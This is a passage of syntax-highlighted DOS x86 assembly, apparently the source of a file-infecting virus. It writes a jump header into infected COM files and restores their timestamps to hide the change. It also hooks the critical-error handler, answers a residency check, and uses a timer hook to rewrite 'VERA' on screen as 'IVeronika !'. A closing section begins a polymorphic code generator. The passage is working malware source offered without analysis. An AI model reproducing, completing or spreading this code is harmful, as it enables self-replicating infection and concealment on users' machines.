    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">;        #        #</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">;        #        #</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">lng</span><span class="sc0">          </span><span class="sc1">;        #        #</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Intr21</span><span class="sc0">          </span><span class="sc1">;        #        #</span><span class="sc0">
</span><span class="sc1">;#########################################        #</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">  </span><span class="sc1">;                         #</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">intr21</span><span class="sc0">  </span><span class="sc1">;                         #</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">      </span><span class="sc1">;                         #</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ds</span><span class="sc0">      </span><span class="sc1">;                         #</span><span class="sc0">
</span><span class="sc1">;##################################################</span><span class="sc0">
                   
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">move</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">New_j</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Intr21</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">date</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">time</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Intr21</span><span class="sc0">
</span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Intr21</span><span class="sc0">
</span><span class="sc5">Late</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Old_24</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">203d</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Old_24a</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">203d</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Intr21</span><span class="sc0">
</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0deadh</span><span class="sc0">
    </span><span class="sc6">Je</span><span class="sc0">      </span><span class="sc5">Ok</span><span class="sc0">
    </span><span class="sc6">Popf</span><span class="sc0">

</span><span class="sc5">Old_21</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">s1</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
</span><span class="sc1">;==============================================================</span><span class="sc0">
</span><span class="sc5">set_24</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Intr21</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">old_24</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">old_24a</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">New_24</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">203d</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Intr21</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc5">New_24</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">Iret</span><span class="sc0">

</span><span class="sc5">ok</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">1996h</span><span class="sc0">
    </span><span class="sc6">Popf</span><span class="sc0">
    </span><span class="sc6">Iret</span><span class="sc0">

</span><span class="sc5">Buf_j</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc5">New_j</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">date</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">move</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Cwd</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Intr21</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">intr21</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Pushf</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09ah</span><span class="sc0">
</span><span class="sc5">s1</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">s2</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc5">int_1c</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">data_3e</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">loc_1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">loc_8</span><span class="sc0">

</span><span class="sc5">Mes</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'IVeronika !'</span><span class="sc0">
</span><span class="sc5">mes_lng</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mes</span><span class="sc0">
</span><span class="sc5">data_2e</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'VERA'</span><span class="sc0">
</span><span class="sc5">data_3e</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">14h</span><span class="sc0">

</span><span class="sc5">loc_1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">data_3e</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0B800h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0fa0h</span><span class="sc0">
</span><span class="sc5">loc_2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc5">loc_3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc0">  </span><span class="sc1">; 'V'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">loc_5</span><span class="sc0">
</span><span class="sc5">loc_4</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">1388h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">loc_3</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">loc_9</span><span class="sc0">
</span><span class="sc5">loc_5</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_2e</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">203d</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">loop_6</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">loc_2</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">loop_6</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">mes_lng</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mes</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">203d</span><span class="sc0">
</span><span class="sc5">loop_7</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">loop_7</span><span class="sc0">
</span><span class="sc5">loc_8</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">data_3e</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
</span><span class="sc5">loc_9</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">Old_1c</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">hm</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">lm</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">_size</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">Old_24</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Old_24a</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">;########################## [IDA]'s Subprograms ###############################</span><span class="sc0">
</span><span class="sc5">Poly</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc5">mem</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">intr21</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">You</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Es</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">new_seg</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D_lng</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D0lng</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Big</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Get_rnd</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">000fh</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Get_off</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Or</span><span class="sc0">      </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Jz</span><span class="sc0">      </span><span class="sc5">Big</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Gen_com</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Di</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Get_rnd</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0025</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Get_off</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Lea</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,[</span><span class="sc8">Di</span><span class="sc4">]+</span><span class="sc5">one_b_op</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Cld</span><span class="sc0">
        </span><span class="sc6">LodSb</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">StoSb</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Loop</span><span class="sc0">    </span><span class="sc5">Gen_com</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D_lng</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">  </span><span class="sc1">;########################## 1</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Get_rnd</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">17</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Get_off</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mul</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Es</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Es</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">log_op</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">cm_off</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_buf</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Cld</span><span class="sc0">
        </span><span class="sc6">MovSw</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Es</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Set_op</span><span class="sc0">                  </span><span class="sc1">;creating table</span><span class="sc0">
        </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">m2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">Je</span><span class="sc0">      </span><span class="sc5">one_com</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D_lng</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
